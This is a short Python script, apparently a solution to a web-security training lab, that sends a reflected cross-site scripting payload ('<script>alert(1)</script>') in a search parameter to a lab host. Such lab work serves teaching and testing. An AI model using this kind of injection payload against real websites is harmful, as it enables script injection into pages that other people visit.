import requests
import sys
import re
from bs4 import BeautifulSoup

site = 'acc21fe91f043ab3c0af033c00fb00aa.web-security-academy.net'
s = requests.Session()
search_url = f'https://{site}/?search=<script>alert(1)</script>'
resp = s.get(search_url)